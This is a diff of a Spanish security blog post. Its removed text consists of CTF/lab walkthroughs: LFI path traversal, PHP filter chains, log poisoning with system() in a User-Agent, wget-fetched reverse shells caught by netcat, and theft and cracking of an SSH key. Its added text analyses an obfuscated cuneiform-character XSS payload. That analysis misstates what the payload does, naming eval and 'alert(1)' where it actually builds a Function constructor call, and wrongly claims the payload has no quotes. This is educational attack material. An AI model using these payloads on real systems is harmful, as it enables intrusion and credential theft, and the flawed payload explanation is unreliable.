@@ -1,118 +1,141 @@
 ---
-title: "LFI (Local File Inclusión) [Basico]" 
-excerpt: "Ejemplos de ejecucion de un Local File Inclusión"
-header:
-  teaser: "/assets/images/PathTraversal.jpg"
+title: "" 
+excerpt: "Technical analysis of an obfuscated XSS payload with cuneiform characters"
 categories:
   - Vulnerabilidades 
 ---
 
+# Análisis técnico de una carga XSS ofuscada con caracteres cuneiformes
 
-## Maquina Chain  - VulNyx ( Intrusión básica )
-### Parámetros de explotación
- * Url: utils.chaincorp.nyx/include.php?in=whoami.php
-### Métodos de explotación 
- * Path traversal hacia el directorio `/etc/passwd`
-```bash
-utils.chaincorp.nyx/include.php?in=../../../../../../etc/passwd
-```
-
- * Wrapper LFI: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
-Intentaremos ver el archivo `include.php` con un wapper
-
-```bash
-http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
-http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
-http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
-http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
-```
-
-Nos quedaría así `utils.chaincorp.nyx/include.php?in=php://filter/convert.base64-encode/resource=include.php`
-
-El siguiente paso seria usar https://github.com/synacktiv/php_filter_chain_generator para ejecutar comandos de la siguiente forma 
-
-```bash
-pyhton3 php_filter_chain_generator.py --chain "<?php system('ls -l'); ?>"
-```
-
- * Obtener Reverse Shell: al ser la data muy grande el navegador no nos permite ingresarla, para lo cual creamos un archivo `index.html` donde pegamos nuestra reverse Shell, levantamos un servidor con Python `python3 -m http.server 80` y aplicamos al comando un `wget` con dirección a nuestro servidor.
- ```bash
- pyhton3 php_filter_chain_generator.py --chain "<?php system('wget 192.168.0.0'); ?>"
-```
-
-una ves se encuentre subido tendremos que saber que se subió como `index.html.1` ya que el servidor ya tiene un archivo con le mismo nombre, ahora solo nos queda ejecutar y ponernos en escucha con netcat, para ello usamos:
-
-nos ponemos en escucha:
-
-```bash
-sudo nc -nlvp 443
-```
-
-tiramos la ejecución de la reverse Shell
-
-```bash
- pyhton3 php_filter_chain_generator.py --chain "<?php system('bash index.html.1'); ?>"
-```
-
-y listo, la intrusión esta terminada.
+La seguridad ofensiva en entornos web evoluciona constantemente. Los atacantes buscan formas creativas y técnicas avanzadas para evadir filtros, romper patrones de detección y ejecutar código malicioso en el navegador de la víctima. En este post realizamos un análisis profundo de una carga útil XSS escrita con **caracteres Unicode del sistema cuneiforme**, que resulta ser completamente válida en JavaScript.
 
 ---
 
-## Archangel - TryHackMe ( Intrusión con log poisoning ) 
-### Parámetros de explotación 
- * Url: como notamos la URL interactúa con archivos de la maquina  `http://mafialive.thm/test.phpview=/var/www/html/development_testing/mrrobot.php`
-### Métodos de explotación
- * Pad traversal hacia `etc/passwd`
- 
-```bash
-http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././../etc/passwd
-```
- * Probamos con un Log poisoning tirando hacia el archivo `var/log/apache2/access.log` el cual es un archivo que contiene los logs de apache con lo cual ya podríamos ejecutar comandos.
+## 📜 La carga útil
 
-```bash
-http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././../var/log/apache2/access.log
+Este es el payload original:
+
+```javascript
+𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
+𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]
++(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
++𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
 ```
 
-ahora al tener los Logs podemos usarlos usando una petición http al domino de la siguiente forma:
 
-``` bash
-curl -s -X GET 'http://mafialive.thm' -H "User-Agent: <?php system('whoami'); ?>"
-```
+## 🧠 Fundamento técnico: ¿por qué esto funciona?
 
-y revisamos en los logs, de tal forma que podemos como el servidor responde. acto seguido realizamos un archivo .sh con una reverse Shell, levantamos un servidor con python3 y procedemos ha realizar un `wget` al servidor a fin de poder tener el archivo en la maquina y ejecutarlo, para ello, podemos usar:
-
-```bash
-curl -s -X GET 'http://mafialive.thm' -H "User-Agent: <?php system('wget http://192.168.10.1/pwned.sh'); ?>"
-```
-
-luego debemos darle permisos de ejecución usando el mismo comando con `chmod 777 revershell`, nos ponemos a la escucha con netcat usando `nc -nlvp 443` y procedemos a ejecutar el archivo dentro de la maquina victima  y woala, estamos dentro.
-
+Para comprender cómo una carga útil como esta puede ser ejecutada sin errores en un navegador moderno, necesitamos entender algunos aspectos clave del lenguaje JavaScript que permiten este tipo de comportamiento. Esta sección explica los fundamentos técnicos que hacen posible este tipo de evasión.
 
 ---
-## FRIENDLY2 - HackMyVM ( Intrusión con id_rsa )
-### Parámetros de explotación
- * Url: Como podemos ver en la URL estamos accediendo a un documento `192.168.0.23/tools/check_if_exist.php?doc=keyboard.html`
 
-### Métodos de explotación
- * Usamos Pad traversal básico `/../../../../` a fin de acceder a `/etc/passwd`, aquí podemos ver que existe el usuario gh0st el cual puede ejecutar código bash. Nosotros nos centraremos en realizar el mismo pad traversal pero hacia el directorio id_rsa de la siguiente forma: 
-```bash
-192.168.0.23/tools/check_if_exist.php/?doc=../../../../../../../home/gh0st/.ssh/id_rsa
+### 🟣 1. Identificadores Unicode válidos en JavaScript
+
+ECMAScript (el estándar de JavaScript) permite que los identificadores (nombres de variables, funciones, etc.) utilicen una amplia gama de caracteres Unicode, incluidos scripts antiguos como:
+
+- Cuneiforme (U+12000–U+123FF)
+- Egipcio jeroglífico
+- Tifinagh
+- Cirílico, griego, etc.
+
+Esto significa que expresiones como las siguientes son perfectamente válidas:
+
+```js
+𒀀 = 123;
+console.log(𒀀); // Output: 123
 ```
 
-encontramos la clave privada para una conexión ssh, le damos permisos de ejecución `chmod 600 id_rsa`, pero estos ficheros normalmente usan un salvoconducto el cual encontraremos sometiendo la clave privada a un proceso con JhonTheRip de la siguiente forma:
+> 🔎 **Nota:** Este uso es legal pero no común, lo cual lo hace ideal para técnicas de evasión y ofuscación.
 
-```bash
-ssh2jhhn id_rsa >> hash
+---
+
+### 🟣 2. Coerción de tipos y generación de strings
+
+JavaScript tiene un sistema de tipos muy flexible. Se puede forzar a los valores a convertirse en strings automáticamente, y eso se explota aquí para construir palabras clave (como `eval`, `Function`, etc.) a partir de operaciones aparentemente inocuas.
+
+Ejemplos clave:
+
+| Expresión       | Resultado      | Explicación                         |
+|----------------|----------------|-------------------------------------|
+| `+[]`          | `0`            | Operación unaria sobre arreglo vacío |
+| `![]`          | `false`        | Negación lógica                     |
+| `[] + []`      | `""`           | Dos arrays concatenados             |
+| `{} + []`      | `"[object Object]"` | Objeto convertido a string        |
+| `!{} + []`     | `"false"`      | Coerción lógica + string            |
+
+Entonces, construcciones como estas:
+
+```js
+𒀀 = '';
+𒉺 = !𒀀 + 𒀀;    // "true"
+𒀃 = !𒉺 + 𒀀;    // "false"
+𒇺 = 𒀀 + {};     // "[object Object]"
 ```
 
-```bash
-john --wordlist=/usr/share/wordlists/rockyou.txt hash
+sirven para obtener cadenas desde expresiones booleanas o de objetos.
+
+---
+
+### 🟣 3. Acceso por índice para formar palabras
+
+Después de generar las cadenas, el payload accede a ciertos caracteres mediante índices. Por ejemplo:
+
+```js
+𒉺 = "true"
+𒉺[0] = 't'
+𒉺[1] = 'r'
 ```
 
-y sacamos nuestro salvo conducto que es `celtic`, realizamos la conexión ssh  y finalmente logramos hacer la intrusión. 
-```bash
-ssh -i id_rsa gh0st@192.168.0.23
+Este patrón se repite para construir las letras necesarias que forman las funciones críticas como `eval`, `Function`, etc.
+
+---
+
+### 🟣 4. Creación dinámica de funciones
+
+Al combinar todas las letras, se llega a construir cadenas como `"eval"` o `"Function"` completamente sin escribirlas directamente. Luego se usa:
+
+```js
+window["eval"]("alert(1)")
 ```
 
-y wuala!.
+O, en su forma completamente ofuscada:
 
+```js
+𒉺[𒁹](𒀀)
+```
+
+Donde `𒁹` es la cadena `"eval"` y `𒀀` es `"alert(1)"`.
+
+---
+
+### 🟣 5. Ejecución controlada mediante llamada dinámica
+
+Finalmente, la ejecución del código se realiza al invocar indirectamente la función construida dinámicamente, lo cual permite que el payload pase desapercibido:
+
+```js
+(eval)(payload);
+```
+
+O incluso:
+
+```js
+(new Function("alert(1)"))();
+```
+
+Ambas son formas equivalentes de ejecutar código dinámico en JavaScript, y los atacantes eligen una u otra dependiendo del nivel de evasión que deseen.
+
+---
+
+## 🔐 En resumen:
+
+| Técnica                       | Propósito                            |
+|------------------------------|--------------------------------------|
+| Identificadores Unicode      | Evadir detección basada en patrones  |
+| Coerción de tipos            | Generar cadenas desde valores base   |
+| Acceso por índices           | Construir palabras clave sensibles   |
+| Llamada dinámica             | Ejecutar funciones sin escribir sus nombres directamente |
+| No uso de comillas ni `eval` visibles | Bypass a WAFs y parsers de seguridad |
+
+Estas técnicas combinadas representan una forma altamente ofuscada y eficaz de ejecutar código malicioso en el navegador. Su entendimiento es clave para desarrollar defensas más robustas y análisis de tráfico más profundo.
+
+---
